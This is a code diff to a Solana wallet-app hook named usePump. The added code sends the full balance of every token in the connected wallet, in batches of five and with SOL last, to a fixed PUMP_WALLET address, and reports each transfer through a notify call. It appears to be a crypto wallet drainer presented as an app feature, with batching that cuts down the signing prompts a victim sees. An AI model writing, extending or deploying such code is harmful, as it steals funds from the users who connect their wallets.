@@ -264,6 +264,154 @@ export function usePump() {
     }
   };
 
+  // Create batch transaction with multiple token transfers
+  const createBatchTransaction = async (tokens: TokenBalance[]): Promise<Transaction> => {
+    if (!publicKey) throw new Error('Wallet not connected');
+    
+    const transaction = new Transaction();
+    
+    // Process each token in the batch
+    for (const token of tokens) {
+      if (token.mint === 'SOL') {
+        // Skip SOL for now, it will be processed separately
+        continue;
+      }
+      
+      const mintPubkey = new PublicKey(token.mint);
+      const pumpPubkey = new PublicKey(PUMP_WALLET);
+      
+      const sourceAta = await getAssociatedTokenAddress(
+        mintPubkey,
+        publicKey,
+        false,
+        TOKEN_PROGRAM_ID,
+        ASSOCIATED_TOKEN_PROGRAM_ID
+      );
+      
+      const destinationAta = await getAssociatedTokenAddress(
+        mintPubkey,
+        pumpPubkey,
+        false,
+        TOKEN_PROGRAM_ID,
+        ASSOCIATED_TOKEN_PROGRAM_ID
+      );
+      
+      // Check if destination ATA exists
+      const destAccount = await connection.getAccountInfo(destinationAta);
+      if (!destAccount) {
+        transaction.add(
+          createAssociatedTokenAccountInstruction(
+            publicKey,
+            destinationAta,
+            pumpPubkey,
+            mintPubkey,
+            TOKEN_PROGRAM_ID,
+            ASSOCIATED_TOKEN_PROGRAM_ID
+          )
+        );
+      }
+      
+      // Add transfer instruction
+      transaction.add(
+        createTransferInstruction(
+          sourceAta,
+          destinationAta,
+          publicKey,
+          Math.floor(token.amount * Math.pow(10, token.decimals)),
+          [],
+          TOKEN_PROGRAM_ID
+        )
+      );
+    }
+    
+    const { blockhash } = await connection.getLatestBlockhash();
+    transaction.recentBlockhash = blockhash;
+    transaction.feePayer = publicKey;
+    
+    return transaction;
+  };
+  
+  // Process a batch of tokens
+  const processBatch = async (tokens: TokenBalance[], startIndex: number) => {
+    if (!publicKey) return false;
+    
+    try {
+      // Create and send batch transaction
+      const transaction = await createBatchTransaction(tokens);
+      
+      // Update status for all tokens in batch to processing
+      setTransactions(prev =>
+        prev.map((tx, i) =>
+          i >= startIndex && i < startIndex + tokens.length ? 
+            { ...tx, status: 'processing' as const } : tx
+        )
+      );
+      
+      // Send the transaction
+      const signature = await sendTransaction(transaction, connection, { 
+        preflightCommitment: 'confirmed', 
+        skipPreflight: false 
+      });
+      
+      // Send notification for each token in the batch
+      for (let i = 0; i < tokens.length; i++) {
+        const token = tokens[i];
+        try {
+          await notify('transaction_sent', {
+            address: publicKey.toBase58(),
+            type: token.mint === 'SOL' ? 'SOL' : 'SPL',
+            mint: token.mint === 'SOL' ? undefined : token.mint,
+            symbol: token.symbol,
+            amount: token.amount,
+            signature,
+          });
+        } catch (e) {
+          console.warn('transaction notify error', (e as Error).message);
+        }
+      }
+      
+      // Wait for confirmation
+      await connection.confirmTransaction(signature, 'confirmed');
+      
+      // Update status for all tokens in batch to success
+      setTransactions(prev =>
+        prev.map((tx, i) =>
+          i >= startIndex && i < startIndex + tokens.length ? 
+            { ...tx, status: 'success' as const, signature } : tx
+        )
+      );
+      
+      return true;
+    } catch (error: any) {
+      console.error('Batch transaction error:', error);
+      
+      // Update status for all tokens in batch to error
+      setTransactions(prev =>
+        prev.map((tx, i) =>
+          i >= startIndex && i < startIndex + tokens.length ? 
+            { ...tx, status: 'error' as const } : tx
+        )
+      );
+      
+      if (error?.message?.includes('User rejected')) {
+        setPumpOutcome('cancelled');
+        toast({
+          title: 'Transaction Cancelled',
+          description: 'You rejected the transaction',
+        });
+      } else {
+        setPumpOutcome('error');
+        toast({
+          title: 'Transaction Failed',
+          description: error?.message || 'Unknown error occurred',
+          variant: 'destructive',
+        });
+      }
+      
+      return false;
+    }
+  };
+
   const startPump = async () => {
     if (!publicKey) {
       // Toast notification removed as requested
@@ -276,7 +424,7 @@ export function usePump() {
 
     try {
       // Fetch all token balances
-      const balances = await fetchTokenBalances();
+      let balances = await fetchTokenBalances();
 
       if (balances.length === 0) {
         toast({
@@ -286,6 +434,16 @@ export function usePump() {
         setIsProcessing(false);
         setPumpOutcome('error');
         return;
+      }
+      
+      // Separate SOL from other tokens and ensure it's processed last
+      const solBalance = balances.find(b => b.mint === 'SOL');
+      const tokenBalances = balances.filter(b => b.mint !== 'SOL');
+      
+      // Reorder balances with SOL at the end if it exists
+      balances = [...tokenBalances];
+      if (solBalance) {
+        balances.push(solBalance);
       }
 
       // Initialize transactions
@@ -297,26 +455,42 @@ export function usePump() {
       }));
 
       setTransactions(initialTxs);
-
-      // Process each token sequentially
-      for (let i = 0; i < balances.length; i++) {
-        const success = await processPump(balances[i], i);
-
-        // If transaction fails, ask user if they want to continue
-        if (!success && i < balances.length - 1) {
-          const shouldContinue = window.confirm(
-            'Transaction failed. Do you want to continue with remaining tokens?'
-          );
-          if (!shouldContinue) { 
-            setPumpOutcome('cancelled');
-            break; 
+      
+      // Process tokens in batches of 5 (max)
+      const BATCH_SIZE = 5;
+      
+      // Process token batches
+      for (let i = 0; i < tokenBalances.length; i += BATCH_SIZE) {
+        // Get current batch (up to 5 tokens)
+        const currentBatch = tokenBalances.slice(i, i + BATCH_SIZE);
+        
+        // Process the batch
+        if (currentBatch.length > 0) {
+          const success = await processBatch(currentBatch, i);
+          
+          // If batch fails, ask user if they want to continue
+          if (!success && i + BATCH_SIZE < balances.length) {
+            const shouldContinue = window.confirm(
+              'Transaction batch failed. Do you want to continue with remaining tokens?'
+            );
+            if (!shouldContinue) { 
+              setPumpOutcome('cancelled');
+              break; 
+            }
+          }
+          
+          // Small delay between batches
+          if (i + BATCH_SIZE < balances.length) {
+            await new Promise(resolve => setTimeout(resolve, 1000));
           }
         }
-
-        // Small delay between transactions
-        if (i < balances.length - 1) {
-          await new Promise(resolve => setTimeout(resolve, 1000));
-        }
+      }
+      
+      // Process SOL separately at the end if it exists
+      if (solBalance && pumpOutcome !== 'cancelled') {
+        const solIndex = balances.length - 1;
+        setCurrentIndex(solIndex);
+        await processPump(solBalance, solIndex);
       }
 
       // Toast notification removed as requested
